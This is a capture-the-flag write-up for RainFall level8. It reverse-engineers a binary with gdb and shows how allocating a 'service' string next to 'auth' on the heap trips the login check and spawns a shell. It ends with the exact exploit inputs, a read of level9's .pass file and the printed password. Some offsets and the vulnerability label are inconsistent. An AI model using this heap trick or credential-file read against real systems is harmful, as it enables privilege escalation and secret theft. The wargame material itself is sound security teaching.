Level8
------

1) 
Purpose of this exercise

This level teaches three important exploitation ideas:

Heap allocation
Use‑After‑Free vulnerability
Overwriting heap data to reach a privileged condition
The goal is to make the program execute: system("/bin/sh")

2) 

After executing the program we get :

level8@RainFall:~$ ./level8 
(nil), (nil) 
hello hello
(nil), (nil)

(nil), (nil) This comes from:

printf("%p, %p\n", auth, service);


0x08048575 <+17>: mov    0x8049ab0,%ecx
0x0804857b <+23>: mov    0x8049aac,%edx
0x08048581 <+29>: mov    $0x8048810,%eax
0x08048586 <+34>: mov    %ecx,0x8(%esp)
0x0804858a <+38>: mov    %edx,0x4(%esp)
0x0804858e <+42>: mov    %eax,(%esp)
0x08048591 <+45>: call   printf


we know that from :

(gdb) x/s 0x8049ab0                              line +17
0x8049ab0 <service>:	 ""
(gdb) x/s 0x8049aac                              line +23
0x8049aac <auth>:	 ""
(gdb) x/s 0x8048810                              line +27
0x8048810:	 "%p, %p \n"

After that the code organize them in the stack

mov %ecx, 0x8(%esp) : 3rd argument (valeur de service).
mov %edx, 0x4(%esp) : 2nd argument (valeur de auth).
mov %eax, (%esp) : 1st argument (la chaîne de format "%p, %p \n").

Registers used:

ecx = service pointer
edx = auth pointer

Loaded from global variables:

0x8049aac → auth
0x8049ab0 → service

So now we know exactly:

Variable	Address
auth pointer	0x8049aac
service pointer	0x8049ab0



3) 

After checking the main function we found:

0x080485ae <+74>:	call   0x8048440 <fgets@plt>

which means : fgets(buffer, size, stdin)

So the program reads a command from the user.
--------------------------------------------


4) 

What happens after fgets

Immediately after fgets, you saw this:

0x080485bb <+87>: lea    0x20(%esp),%eax
0x080485bf <+91>: mov    %eax,%edx
0x080485c1 <+93>: mov    $0x8048819,%eax
0x080485c6 <+98>: mov    $0x5,%ecx
0x080485cb <+103>: mov    %edx,%esi
0x080485cd <+105>: mov    %eax,%edi
0x080485cf <+107>: repz cmpsb

This instruction is very important: repz cmpsb

It means: compare two strings byte by byte

Registers used:

ESI = user input
EDI = constant string
ECX = length

So the program is doing something like:

strncmp(input, "?????", 5)

5) Find the string being compared

mov $0x8048819,%eax

That means: EDI = 0x8048819

So the string is stored at address: 0x8048819

In gdb we inspect it:

(gdb) x/s 0x8048819
0x8048819:	 "auth "

we can see: 0x8048819: "auth "

Now we discovered the first command: auth

6) Continue reading assembly


Each time the program compares the input with another string.

By inspecting those addresses with GDB:

(gdb) x/s ADDRESS

we discover the commands.


   0x080485c1 <+93>:	mov    $0x8048819,%eax
   0x080485c6 <+98>:	mov    $0x5,%ecx
   0x080485cb <+103>:	mov    %edx,%esi
   0x080485cd <+105>:	mov    %eax,%edi
   0x080485cf <+107>:	repz cmpsb %es:(%edi),%ds:(%esi)


   0x08048648 <+228>:	mov    $0x804881f,%eax
   0x0804864d <+233>:	mov    $0x5,%ecx
   0x08048652 <+238>:	mov    %edx,%esi
   0x08048654 <+240>:	mov    %eax,%edi
   0x08048656 <+242>:	repz cmpsb %es:(%edi),%ds:(%esi)



    0x0804867e <+282>:	mov    $0x8048825,%eax
   0x08048683 <+287>:	mov    $0x6,%ecx
   0x08048688 <+292>:	mov    %edx,%esi
   0x0804868a <+294>:	mov    %eax,%edi
   0x0804868c <+296>:	repz cmpsb %es:(%edi),%ds:(%esi)


      0x080486b9 <+341>:	mov    %eax,%edx
   0x080486bb <+343>:	mov    $0x804882d,%eax
   0x080486c0 <+348>:	mov    $0x5,%ecx
   0x080486c5 <+353>:	mov    %edx,%esi
   0x080486c7 <+355>:	mov    %eax,%edi
   0x080486c9 <+357>:	repz cmpsb %es:(%edi),%ds:(%esi)



(gdb) x/s 0x804881f
0x804881f:	 "reset"

(gdb) x/s 0x8048825
0x8048825:	 "service"

(gdb) x/s 0x804882d
0x804882d:	 "login"


The commands inside the program are:

auth
service
reset
login

Example usage:

auth something
service something
reset
login

6) What each command does

auth "something"
---------------

Assembly shows:

call malloc
mov %eax,0x8049aac

So:

auth = malloc(4)
strcpy(auth, input_after_auth)

Example: auth test

Result: auth → 0x804a008




service "something"
-------------------

Assembly shows:

call strdup
mov %eax,0x8049ab0
So:
￼
service = strdup(input_after_service)
Example:

service 0123456789abcdef
Result:

service → 0x804a018

 
Heap layout
-----------

After the two allocations:

0x804a008   auth chunk
0x804a018   service chunk

They are next to each other in memory.


What login checks
-----------------

Assembly:

mov 0x8049aac,%eax
mov 0x20(%eax),%eax         0x20 = 32
test %eax,%eax

Meaning:

if (*(auth + 32) != 0)
    system("/bin/sh");


(gdb) x/s 0x8049aac
0x8049aac <auth>:	 ""


So the program reads 32 bytes after auth.


We know that auth start at 0x804a008

because :

auth test
0x804a008, (nil) 


IN other words:
----------------

What login checks

From assembly:

0x080486e2: mov 0x8049aac,%eax
0x080486e7: mov 0x20(%eax),%eax
0x080486ea: test %eax,%eax
0x080486ec: je   0x80486ff
0x080486ee: call system

Meaning in C:

if (*(auth + 32) != 0)
    system("/bin/sh");

So the program checks byte at offset 32 from auth.

Calculate the checked address
auth + 32
0x804a008 + 0x20
= 0x804a028

So the program reads memory at:

0x804a028

Look what service allocates
-----------------------------

After:

service something

the program prints:

service = 0x804a018

So service memory starts at:

0x804a018

Compare the addresses
service start : 0x804a018
auth + 32     : 0x804a028

Distance:

0x804a028 - 0x804a018 = 0x10 = 16 bytes

So auth+32 is 16 bytes inside the service string.


Counting from auth (user pointer = 0x804a010):

auth + 0  → first byte of auth
auth + 1  → ...
auth + 4  → heap metadata of next chunk (approx)
auth + 12 → more metadata
auth + 32 → somewhere inside service’s user data

That’s why filling service with 32+ bytes of 'A' will overwrite auth[32].



Solution
--------

level8@RainFall:~$ ./level8 
(nil), (nil) 
auth test
0x804a008, (nil) 
service 0123456789abcdef
0x804a008, 0x804a018 
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
